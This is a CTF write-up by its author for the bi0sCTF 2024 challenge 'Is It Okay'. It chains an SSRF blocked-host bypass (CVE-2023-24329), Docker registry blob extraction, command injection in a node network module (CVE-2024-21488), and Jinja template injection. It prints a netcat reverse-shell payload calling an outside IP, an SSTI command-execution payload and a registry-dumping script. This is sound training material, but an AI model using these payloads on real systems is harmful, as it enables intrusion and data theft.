---
title: Is It Okay - bi0sCTF 2024
date: 2024-02-26 18:36:17
author: Winters
author_url: https://twitter.com/ArunKr1shnan
categories:
  - Misc
tags:
  - SSRF
  - Docker registry
  - System misconfiguration
---

**tl;dr**

+ Fuzzing to find the ``/internal`` endpoint
+ Chaining CVE-2023–24329 and the SSRF in the ``/okay`` endpoint to access the internal docker registry host.
+ Downloading image blobs using the docker registry API.
+ Using CVE-2024-21488 to get RCE on the ``vec`` service.
+ As the templates directory of the ``core`` service is cross-mounted, we can modify the index.html file from vec service to get RCE on the core service.
+ Hence we can read the flag from the core service.

<!--more-->

**Challenge Points**: 964
**No. of solves**: 9
**Challenge Author**: Winters

## Challenge Description

Is this really ok......


## Initial Analysis

**Challenge doesn't require players to guess any part of the challenge everything was there where it was required**

We are given an instancer url, on visiting the instancer we can make a new instance for a particular team, now after a basic authentication process we can access the actual challenge.

We'll see a webpage with a field to enter a url, and a request is being made to ``http://host:port/native`` which returns the gateway address of the server, This will prove to be a critical bug later on.

### Fuzzing 

On the challenge page, you can basically give a url and the service will send a request to that endpoint, which hints towards an obvious SSRF, But how can we elevate this to get something useful, we need to find some internal endpoints. So fuzzing the challenge url would reveal the ``/internal`` endpoint, which lists all services running on the server. One of those service which is not exposed to the outside world is the ``http://registry:5000`` service. Now we can try using the SSRF to access the internal docker registry host.
If we give the url as ``http://registry:5000`` we'll get the response ``Not Okay, blocked host``. This means that the server has implemented some checks to prevent the users from accessing the registry. 


### CVE-2023–24329

On giving a url like ``http://example.co`` or a malformed url we can see that a urllib error is spit out, so the backend is using urllib, Now one inspecting the response headers we can see that the python version is ``Python/3.11.3`` Now on doing a google search including urllib and python 3.11.3 we can see that there is a CVE-2023-24329 which is a urllib blocked hosts bypass using a whitespace character. So we can send the a request to `` http://registry:5000`` **Notice the whitespace character at the start**. Now we can directly talk to the internal registry API without any issues.


### The docker registry

On Sending a request to `` http://registry:5000/v2/_catalog`` we can see that there are two repositories which are there, namely ``Vec`` and ``Core`` which are the same services listed on the ``/internal`` endpoint. Now we can load in the manifest file for each of the repos and then individually download all the image blobs for each of the repos, One can easily use the docker registry API to do this, and it is well documented here [registry_api](https://distribution.github.io/distribution/spec/api/).

Here is an example script to download the blobs for the repos.

```python
# Script to download the blobs for the Vec repo
import requests

URL  = 'http://34.18.13.217:52593/okay'

# Notice the whitespace at the beginning of the URL
INTERNAL_URL = ' http://registry:5000/v2/'

# Get the name of the image
def get_image_name():
    r = requests.post(URL, data={'url': INTERNAL_URL+'_catalog'})
    print(r.json())


# Get the manifest and get the blobs
def get_blobs():
    r = requests.post(URL, data={'url': INTERNAL_URL+'vec/manifests/latest'})
    # Parse it as json
    parsed = r.json()
    fsLayers = parsed['fsLayers']
    count  = 0
    for i in fsLayers:
        blob_sum  = i['blobSum']
        dowload_path = './blobs/'+str(count)+'.tar.gz'
        r = requests.post(URL, data={'url': INTERNAL_URL+'vec/blobs/'+blob_sum})
        print(r.text)
        if(r.status_code == 200):
            with open(dowload_path,'wb') as file:
                file.write(r.content)
        count += 1 

get_blobs()
```

Now we have the source code for both of the services. But just grepping through the downloaded folders we can see that there are no flags in these repos. So where is the flag?

### Source Code Analysis, RCE on the VEC service

This is the source code for the Vec service

```javascript
const express = require("express");
const network = require("network");

var app = express();

app.get('/native',(req,res)=>{
    network.gateway_ip_for("eth0",  (err,out) => {
        if(out){
            res.setHeader('Content-Type', 'application/json');
            res.setHeader('Access-Control-Allow-Origin', '*');
            res.send(out);
        }
        else{
            res.setHeader('Content-Type', 'application/json');
            res.setHeader('Access-Control-Allow-Origin', '*');
            res.send('10.113.123.22');
        } 
    });
});

app.get('/custom',(req,res)=>{
    let resp = req.query.interface
    console.log(resp);
    network.gateway_ip_for(resp,(err,out)=>{
        res.setHeader('Content-Type', 'application/json');
        res.setHeader('Access-Control-Allow-Origin', '*');
        res.send(out);
    });
});

app.listen(3000,()=>{
    console.log("Vector listening on port 3000");
});
```
So remember when i told you the website is making a cross origin request to the ``/native`` endpoint which returns a gateway address, well that is handled by the ``Vec`` service and the source code for the service is as given above. 

Interestingly we can see a different endpoint ``/custom`` which takes in a user parameter and passes it into a function called ``network.gateway_ip_for``, this function is defined in the network module that is being used, Now this particular module had an RCE vulnerability associated with it recently ``CVE-2024-21488``. 

So how can we use this here, POC's out there for this CVE uses a different function call than ``gateway_ip_for``, so what can we do now?
Well we can look through the source code of the network module and see the definition of the ``gateway_ip_for`` function. 

The source code for it is as follows

**Before Patch**

```javascript
exports.gateway_ip_for = function(nic_name, cb) {
  trim_exec("ip r | grep " + nic_name + " | grep default | cut -d ' ' -f 3 | head -n1", cb);
};
```

**After patch by the vendor**

```javascript
function ensure_valid_nic(str) {
  if (str.match(/[^\w]/))
    throw new Error("Invalid nic name given: " + str);
}

exports.gateway_ip_for = function(nic_name, cb) {
  ensure_valid_nic(nic_name);
  trim_exec("ip r | grep " + nic_name + " | grep default | cut -d ' ' -f 3 | head -n1", cb);
};
```

As you can see there before the patch we had complete control over the ``nic_name`` parameter for the function ``gateway_ip_for``, and this is directly executed as shell command, Nice!. So basically we can get RCE on the ``Vec`` service by using the following payload

 ```bash
 curl "http://host:port/custom/?interface=| rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.113.21.179 5001 >/tmp/f #"
 ```

### Cross Mount RCE on the Core service

Now we have an RCE on the ``Vec`` service, which you can escalate to a reverse shell, but on searching the filesystem of the ``Vec`` service we can see that there is no flag, At this point the flag is not in the ``registry`` service, not in the ``Vec`` service so it has to be in the ``Core`` service so that means we have to somehow get file read on that service from the ``Vec`` service. 

Interestinly we can see a templates folder in the ``Vec`` service which has the index.html for the ``Core`` service, which is just the html for the initial link that we visited where we could give links and it would make a request, that seems a little sus.

If we run the command ``lsblk`` on the ``Vec`` service we can see that indeed the templates directory is mounted from the host system.
So at this point a natural idea will be to modify the index.html file and hope that'll get reflected on the ``Core`` service as well.

Our theory can be verified by seeing the line in the source code for the ``Core`` service 

```python
app.config['TEMPLATES_AUTO_RELOAD'] = True
```

So basically whenever a change is made to the templates directory it is automatically reloaded, and the change is immediately reflected on the website.

So finally putting all those findings together we can certify the following theory that the templates directory is mounted from the host to both the ``Vec`` and the ``Core`` service, and any changes made to the templates directory from the ``Vec`` service will be reflected on the ``Core`` service as well.

Now we can give any SSTI payload inside index.html on the ``Vec`` service and that change will be reflected on the ``Core`` service as well, essentially we now have RCE on the ``Core`` service.

The following SSTI payload can be used to read the flag

```html
<html>
  <body>
    {{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag/flag.txt').read() }}
  </body>
</html>
```

After that just reload the challenge url and the flag should be there.

That was the entire challenge, I wanted the challenge to be a little inclined towards general system security, I learned a lot while making this challenge, and I hope you learned something while solving it as well.

Until next time.